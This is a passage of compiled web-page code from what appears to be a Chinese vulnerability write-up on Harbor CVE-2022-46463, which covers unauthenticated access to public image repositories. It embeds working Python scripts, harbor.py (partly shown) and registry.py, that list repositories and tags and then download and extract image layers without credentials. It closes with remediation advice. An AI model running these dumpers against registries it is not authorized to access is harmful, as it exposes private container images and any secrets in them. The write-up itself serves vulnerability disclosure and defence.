        self<span class="token punctuation">.</span>v2 <span class="token operator">=</span> args<span class="token punctuation">.</span>v2
        self<span class="token punctuation">.</span>list_tags <span class="token operator">=</span> args<span class="token punctuation">.</span>tags
        images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> args<span class="token punctuation">.</span>dump<span class="token punctuation">:</span>
            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>args<span class="token punctuation">.</span>dump<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            images <span class="token operator">=</span> self<span class="token punctuation">.</span>getImages<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> images <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>images<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] 0 public images found.&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>dump_all<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
        <span class="token keyword">for</span> image <span class="token keyword">in</span> images<span class="token punctuation">:</span>
            auth <span class="token operator">=</span> self<span class="token punctuation">.</span>getToken<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
            <span class="token keyword">if</span> auth <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Get token failed.&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>
            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Bearer &quot;</span><span class="token operator">+</span>auth<span class="token punctuation">}</span>
            tags <span class="token operator">=</span> self<span class="token punctuation">.</span>getTags<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
            <span class="token keyword">for</span> tag <span class="token keyword">in</span> tags<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Dumping : %s:%s&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>tag<span class="token punctuation">[</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>tag<span class="token punctuation">[</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>getBlob<span class="token punctuation">(</span>tag<span class="token punctuation">[</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>tag<span class="token punctuation">[</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>tag<span class="token punctuation">[</span><span class="token string">&quot;sha256&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>header<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    args <span class="token operator">=</span> manageArgs<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> HarborUnauth<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m<span class="token punctuation">.</span>check<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),w={href:"http://registry.py",target:"_blank",rel:"noopener noreferrer"},_=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> tarfile
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests

requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

CACHE_PATH <span class="token operator">=</span> <span class="token string">&quot;./caches/&quot;</span>
TIMEOUT <span class="token operator">=</span> <span class="token number">5</span>

<span class="token keyword">def</span> <span class="token function">manageArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;URL&quot;</span><span class="token punctuation">)</span>
    action <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--dump&quot;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&quot;IMAGENAME&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;dump&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;ImageName&quot;</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--tags&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;tags&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;list tags&quot;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--dump_all&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;dump_all&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;dump all&quot;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> args

<span class="token keyword">def</span> <span class="token function">createDir</span><span class="token punctuation">(</span>directoryName<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&quot;../&quot;</span> <span class="token keyword">in</span> directoryName<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Hacker!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>directoryName<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>directoryName<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">RegistryUnauth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getImages</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/v2/_catalog&quot;</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>target
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            repos <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;repositories&quot;</span><span class="token punctuation">]</span>
            images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> repo <span class="token keyword">in</span> repos<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+]&quot;</span><span class="token punctuation">,</span>repo<span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>getTags<span class="token punctuation">(</span>repo<span class="token punctuation">)</span>
                images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>repo<span class="token punctuation">)</span>
            <span class="token keyword">return</span> images
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Not vulnerability.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">getTags</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/v2/%s/tags/list&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token punctuation">,</span>image_name<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            tags <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;tags&quot;</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> tag <span class="token keyword">in</span> tags<span class="token punctuation">:</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;    [*] </span><span class="token interpolation"><span class="token punctuation">{</span>image_name<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>tag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">:</span>image_name<span class="token punctuation">,</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">:</span>tag<span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Get tags failed,&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> results
    
    <span class="token keyword">def</span> <span class="token function">getBlob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/v2/%s/manifests/%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>tag<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            layers <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;fsLayers&quot;</span><span class="token punctuation">]</span>
            createDir<span class="token punctuation">(</span>image_name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>tag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> l <span class="token keyword">in</span> layers<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>downloadSha<span class="token punctuation">(</span>image_name<span class="token punctuation">,</span>tag<span class="token punctuation">,</span>l<span class="token punctuation">[</span><span class="token string">&quot;blobSum&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-]&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">downloadSha</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>version<span class="token punctuation">,</span>sha256<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">dir</span> <span class="token operator">=</span> image_name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>version<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> sha256<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        filenamesha <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">dir</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">.tar.gz&quot;</span></span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>target<span class="token punctuation">}</span></span><span class="token string">/v2/</span><span class="token interpolation"><span class="token punctuation">{</span>image_name<span class="token punctuation">}</span></span><span class="token string">/blobs/</span><span class="token interpolation"><span class="token punctuation">{</span>sha256<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;    [+] Downloading : </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filenamesha<span class="token punctuation">,</span> <span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>
                    <span class="token keyword">for</span> bits <span class="token keyword">in</span> req<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
                tf <span class="token operator">=</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>filenamesha<span class="token punctuation">)</span>
                tf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">dir</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filenamesha<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;    [-] Download fail:&quot;</span><span class="token punctuation">,</span>req<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>target <span class="token operator">=</span> args<span class="token punctuation">.</span>url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>list_tags <span class="token operator">=</span> args<span class="token punctuation">.</span>tags
        images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> args<span class="token punctuation">.</span>dump<span class="token punctuation">:</span>
            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>args<span class="token punctuation">.</span>dump<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            images <span class="token operator">=</span> self<span class="token punctuation">.</span>getImages<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> images <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>images<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] 0 public images found.&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>dump_all<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
        <span class="token keyword">for</span> image <span class="token keyword">in</span> images<span class="token punctuation">:</span>
            tags <span class="token operator">=</span> self<span class="token punctuation">.</span>getTags<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
            <span class="token keyword">for</span> tag <span class="token keyword">in</span> tags<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Dumping : %s:%s&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>tag<span class="token punctuation">[</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>tag<span class="token punctuation">[</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>getBlob<span class="token punctuation">(</span>tag<span class="token punctuation">[</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>tag<span class="token punctuation">[</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    args <span class="token operator">=</span> manageArgs<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> RegistryUnauth<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m<span class="token punctuation">.</span>check<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><ol><li>限制公开访问，进入“项目设置”→“配置管理”→“项目仓库”中的“公开”，取消勾选。</li><li>在业务允许的前提下，将系统部署在内网，减少外部暴露面。</li></ol>`,3);function h(T,x){const a=e("ExternalLinkIcon");return c(),i("div",null,[u,n("ul",null,[n("li",null,[n("a",k,[s("https://mp.weixin.qq.com/s/pBkJW1_Vpf_suH50e8K9kg"),t(a)])]),n("li",null,[n("a",r,[s("https://mp.weixin.qq.com/s/V8Ecqq_DPOQhH5q9UBWkXg"),t(a)])]),n("li",null,[n("a",d,[s("https://github.com/404tk/CVE-2022-46463"),t(a)])])]),v,n("ol",null,[n("li",null,[s("通过 "),n("a",m,[s("404tk/CVE-2022-46463"),t(a)]),s(" 枚举公开镜像并 dump；")]),b,g]),q,n("p",null,[n("a",f,[s("harbor.py"),t(a)])]),y,n("p",null,[n("a",w,[s("registry.py"),t(a)]),s("（Docker Registry API dump）")]),_])}const H=o(l,[["render",h],["__file","Harbor 公开镜像仓库未授权访问 CVE-2022-46463.html.vue"]]);export{H as default};
